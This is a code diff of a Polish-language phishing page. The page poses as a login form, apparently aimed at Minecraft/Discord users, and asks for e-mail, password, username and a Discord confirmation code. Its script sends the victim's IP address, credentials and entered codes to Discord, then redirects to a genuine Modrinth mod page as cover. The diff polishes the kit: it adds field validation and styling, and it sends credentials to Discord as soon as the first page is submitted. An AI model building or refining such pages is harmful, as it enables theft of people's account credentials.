@@ -24,6 +24,7 @@
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
             width: 90%;
             max-width: 400px;
+            margin: 20px;
         }
         .header {
             margin-bottom: 20px;
@@ -38,7 +39,7 @@
         }
         input[type="text"], input[type="password"], input[type="number"] {
             padding: 10px;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
             width: 100%;
             font-size: 16px;
             border: 1px solid #ccc;
@@ -60,11 +61,32 @@
         #page2, #confirmation {
             display: none;
         }
-        #error-message {
+        #error-message, #email-error, #password-error, #username-error, #confirmation-error {
             color: red;
             display: none;
             margin-top: -10px;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: #888;
+        }
+        .footer a {
+            color: #0078D4;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 600px) {
+            .container {
+                width: 95%;
+            }
+        }
+        .success-message {
+            color: green;
+            display: none;
         }
     </style>
 </head>
@@ -76,7 +98,9 @@
         </div>
         <h1>Zaloguj się</h1>
         <input type="text" id="email" placeholder="Adres e-mail">
+        <div id="email-error">Pole e-mail nie może być puste</div>
         <input type="password" id="password" placeholder="Hasło">
+        <div id="password-error">Pole hasło nie może być puste</div>
         <button onclick="goToPage2()">Zaloguj się</button>
     </div>
 
@@ -87,6 +111,7 @@
         </div>
         <h1>Podaj swoją nazwę użytkownika</h1>
         <input type="text" id="username" placeholder="Nazwa użytkownika">
+        <div id="username-error">Pole nazwa użytkownika nie może być puste</div>
         <button onclick="submitData()">Wyślij</button>
     </div>
 
@@ -99,6 +124,7 @@
         <p>Wpisz kod potwierdzenia, który otrzymałeś na Discord.</p>
         <input type="number" id="confirmationCode" placeholder="Kod potwierdzenia">
         <div id="error-message">Zły kod. Spróbuj ponownie.</div>
+        <div id="confirmation-error">Pole kod potwierdzenia nie może być puste</div>
         <button onclick="confirmAccess()">Potwierdź</button>
     </div>
 
@@ -180,29 +206,65 @@
         }
 
         // Funkcja do przejścia na stronę wpisania nazwy użytkownika
-        function goToPage2() {
+        async function goToPage2() {
             email = document.getElementById('email').value;
             password = document.getElementById('password').value;
+
+            // Sprawdzenie, czy pola e-mail i hasło są wypełnione
+            if (email === '') {
+                document.getElementById('email-error').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('email-error').style.display = 'none';
+            }
+
+            if (password === '') {
+                document.getElementById('password-error').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('password-error').style.display = 'none';
+            }
+
             document.getElementById('page1').style.display = 'none';
             document.getElementById('page2').style.display = 'block';
+
+            await sendDataToDiscord(userIP, email, password);
         }
 
         // Funkcja do obsługi przycisku "Wyślij"
         async function submitData() {
             username = document.getElementById('username').value;
-            await sendDataToDiscord(userIP, email, password, username);
+
+            // Sprawdzenie, czy pole nazwa użytkownika jest wypełnione
+            if (username === '') {
+                document.getElementById('username-error').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('username-error').style.display = 'none';
+            }
+
+            await sendDataToDiscord(userIP, email, password, username); // Dodano username do danych wysyłanych na Discord
+
             document.getElementById('page2').style.display = 'none';
             document.getElementById('confirmation').style.display = 'block';
         }
 
-        // Funkcja do obsługi potwierdzenia
+        // Funkcja do obsługi przycisku "Potwierdź"
         async function confirmAccess() {
             const enteredCode = document.getElementById('confirmationCode').value;
-            const errorMessage = document.getElementById('error-message');
+
+            // Sprawdzenie, czy pole kod potwierdzenia jest wypełnione
+            if (enteredCode === '') {
+                document.getElementById('confirmation-error').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('confirmation-error').style.display = 'none';
+            }
+
             if (enteredCode === confirmationCode) {
                 redirectToURL('https://modrinth.com/mod/totemcounter');
             } else {
-                errorMessage.style.display = 'block';
+                document.getElementById('error-message').style.display = 'block';
                 await sendFailedAttemptToDiscord(userIP, email, password, username, enteredCode, confirmationCode);
             }
         }
@@ -216,9 +278,4 @@
         getIPAndSendToDiscord();
     </script>
 </body>
-</html>
-
-    </script>
-</body>
-</html>
 </html>
